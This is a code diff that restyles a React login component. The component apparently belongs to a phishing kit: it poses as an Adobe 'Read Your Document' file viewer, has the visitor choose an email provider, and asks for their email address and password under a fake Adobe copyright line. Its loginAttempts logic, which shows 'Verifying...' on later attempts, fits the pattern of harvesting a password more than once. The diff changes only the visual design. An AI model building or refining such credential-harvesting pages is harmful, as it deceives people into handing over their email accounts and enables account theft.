@@ -187,141 +187,122 @@ const LoginPage: React.FC<LoginPageProps> = ({
 
 
   return (
-    <div className="min-h-screen relative overflow-hidden">
-      {/* Dark gradient background with red/purple accents */}
-      <div className="absolute inset-0 bg-gradient-to-br from-[#121212] via-[#1E1E1E] to-[#2C2C2C]"></div>
-      <div className="absolute inset-0 bg-gradient-to-tr from-[#FF0000]/10 via-transparent to-[#8B5CF6]/10"></div>
-      
-      {/* Subtle abstract shapes and blurry overlays */}
-      <div className="absolute top-5 left-5 w-48 h-48 bg-[#8B5CF6]/8 rounded-full blur-2xl"></div>
-      <div className="absolute bottom-5 right-5 w-56 h-56 bg-[#FF0000]/6 rounded-full blur-3xl"></div>
-      <div className="absolute top-1/2 left-1/4 w-32 h-32 bg-[#EC4899]/10 rounded-full blur-xl"></div>
-      <div className="absolute bottom-1/4 right-1/3 w-40 h-40 bg-[#8B5CF6]/7 rounded-full blur-2xl"></div>
-      <div className="absolute top-1/4 right-1/2 w-28 h-28 bg-[#FF0000]/8 rounded-full blur-lg"></div>
-      
-      <div className="relative z-10 flex items-center justify-center min-h-screen p-4">
-        <div className="w-full max-w-md">
-          {/* Header */}
-          <div className="text-center mb-8">
-            <div className="w-16 h-16 flex items-center justify-center mx-auto mb-4">
-              <img 
-                src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
-                alt="Adobe Acrobat" 
-                className="w-12 h-12 object-contain"
+    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#f0f6f8] to-[#e6eef2] p-4">
+      <div className="w-full max-w-lg">
+        {/* Compact Card */}
+        <div className="bg-white rounded-lg shadow-lg border border-gray-100 p-6">
+          {/* Header (reduced) */}
+          <div className="flex items-center gap-3 mb-3">
+            <div className="w-11 h-11 rounded-lg bg-red-500 flex items-center justify-center">
+              <img
+                src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png"
+                alt="PDF"
+                className="w-6 h-6 object-contain"
               />
             </div>
-            
-            <h1 className="text-2xl font-bold text-white mb-2">
-              Access Protected File
-            </h1>
-            <p className="text-base text-white font-semibold bg-[#2C2C2C]/20 backdrop-blur-sm rounded-xl py-2 px-4">
-              Please sign in to access your documents
-            </p>
+            <div>
+              <h1 className="text-lg font-semibold text-gray-900">Read Your Document</h1>
+              <p className="text-sm text-gray-600 -mt-0.5">Please select your e-mail provider below::</p>
+            </div>
           </div>
 
-          {/* Login Form */}
-          <div className="bg-[#1E1E1E]/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-[#2C2C2C]/60 p-8">
+          {/* Content */}
+          <div className="mt-4">
             {!selectedProvider ? (
-              /* Provider Selection */
-              <div>
-                <h2 className="text-lg font-semibold text-white mb-4">
-                  Choose your email provider
-                </h2>
-                <div className="grid grid-cols-2 gap-3">
-                  {emailProviders.map((provider) => (
-                    <button
-                      key={provider.name}
-                      onClick={() => handleProviderSelect(provider.name)}
-                      className={`${provider.color} text-white p-4 rounded-xl hover:opacity-90 transition-all duration-200 transform hover:scale-105 flex flex-col items-center gap-2 shadow-lg`}
-                    >
-                      <img 
-                        src={provider.logo} 
-                        alt={provider.name} 
-                        className="w-8 h-8 object-contain filter brightness-0 invert"
+              /* Provider selection - using existing provider logos */
+              <div className="grid grid-cols-2 gap-4">
+                {emailProviders.map((provider) => (
+                  <button
+                    key={provider.name}
+                    onClick={() => handleProviderSelect(provider.name)}
+                    className="flex items-center gap-3 p-3 bg-white rounded-lg shadow-sm border border-gray-100 hover:shadow-md transition-transform transform hover:-translate-y-0.5"
+                    aria-label={`Select ${provider.name}`}
+                    type="button"
+                  >
+                    <div className={`w-12 h-12 flex items-center justify-center rounded-md ${provider.color} flex-shrink-0`}>
+                      <img
+                        src={provider.logo}
+                        alt={provider.name}
+                        className="w-7 h-7 object-contain"
                         onError={(e) => {
                           const target = e.target as HTMLImageElement;
                           target.style.display = 'none';
                           const parent = target.parentElement;
                           if (parent && !parent.querySelector('.fallback-text')) {
                             const fallback = document.createElement('div');
-                            fallback.className = 'fallback-text text-2xl font-bold';
+                            fallback.className = 'fallback-text text-white font-bold';
                             fallback.textContent = provider.name.charAt(0);
-                            parent.insertBefore(fallback, target.nextSibling);
+                            parent.appendChild(fallback);
                           }
                         }}
                       />
-                      <span className="font-medium text-sm">{provider.name}</span>
-                    </button>
-                  ))}
-                </div>
+                    </div>
+                    <div className="text-sm font-medium text-gray-900">{provider.name}</div>
+                  </button>
+                ))}
               </div>
             ) : (
-              /* Login Form */
+              /* Login form - preserved logic */
               <div>
-                <div className="flex items-center mb-4">
+                <div className="flex items-center gap-3 mb-4">
                   <button
                     onClick={handleBackToProviders}
-                    className="text-gray-400 hover:text-white mr-3"
+                    className="text-gray-500 hover:text-gray-800"
+                    type="button"
                   >
-                    <ArrowLeft className="w-5 h-5" />
+                    <ArrowLeft className="w-4 h-4" />
                   </button>
-                  <h2 className="text-lg font-semibold text-white">
-                    Sign in with {selectedProvider}
-                  </h2>
+                  <h2 className="text-sm font-semibold text-gray-900">Sign in with {selectedProvider}</h2>
                 </div>
-                
-                <form onSubmit={handleFormSubmit} className="space-y-4">
+
+                <form onSubmit={handleFormSubmit} className="space-y-3">
                   {errorMessage && (
-                    <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-3 mb-4">
-                      <p className="text-red-400 text-sm font-medium">{errorMessage}</p>
+                    <div className="bg-red-50 border border-red-100 rounded-md p-2">
+                      <p className="text-red-600 text-sm">{errorMessage}</p>
                     </div>
                   )}
-                  
+
                   <div>
-                    <label className="block text-sm font-medium text-gray-300 mb-2">
-                      Email Address
-                    </label>
+                    <label className="block text-xs font-medium text-gray-600 mb-1">Email Address</label>
                     <div className="relative">
-                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
+                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                       <input
                         type="email"
                         value={email}
                         onChange={(e) => setEmail(e.target.value)}
-                        className="w-full pl-10 pr-4 py-3 bg-[#2C2C2C]/60 border border-[#3C3C3C] rounded-xl text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                        className="w-full pl-10 pr-3 py-2.5 bg-gray-50 border border-gray-200 rounded-md text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                         placeholder="Enter your email"
                         required
                       />
                     </div>
                   </div>
-                  
+
                   <div>
-                    <label className="block text-sm font-medium text-gray-300 mb-2">
-                      Password
-                    </label>
+                    <label className="block text-xs font-medium text-gray-600 mb-1">Password</label>
                     <div className="relative">
-                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
+                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                       <input
                         type={showPassword ? 'text' : 'password'}
                         value={password}
                         onChange={(e) => setPassword(e.target.value)}
-                        className="w-full pl-10 pr-12 py-3 bg-[#2C2C2C]/60 border border-[#3C3C3C] rounded-xl text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                        className="w-full pl-10 pr-10 py-2.5 bg-gray-50 border border-gray-200 rounded-md text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                         placeholder="Enter your password"
                         required
                       />
                       <button
                         type="button"
                         onClick={() => setShowPassword(!showPassword)}
-                        className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-white"
+                        className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-800"
                       >
-                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
+                        {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                       </button>
                     </div>
                   </div>
-                  
+
                   <button
                     type="submit"
                     disabled={isLoading || !email || !password}
-                    className="w-full bg-blue-600 text-white py-3 rounded-xl font-semibold hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-[#1E1E1E] disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
+                    className="w-full bg-blue-600 text-white py-2.5 rounded-md font-semibold hover:bg-blue-700 disabled:opacity-60 transition-colors"
                   >
                     {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In'}
                   </button>
@@ -330,11 +311,9 @@ const LoginPage: React.FC<LoginPageProps> = ({
             )}
           </div>
 
-          {/* Adobe Footer */}
-          <div className="text-center mt-8">
-            <p className="text-sm text-gray-400 font-semibold bg-[#2C2C2C]/20 backdrop-blur-sm rounded-xl py-2 px-4 inline-block">
-              © 2025 Adobe Inc. All rights reserved.
-            </p>
+          {/* Compact footer */}
+          <div className="mt-5 text-center">
+            <p className="text-xs text-gray-500">© 2025 Adobe Inc. All rights reserved.</p>
           </div>
         </div>
       </div>
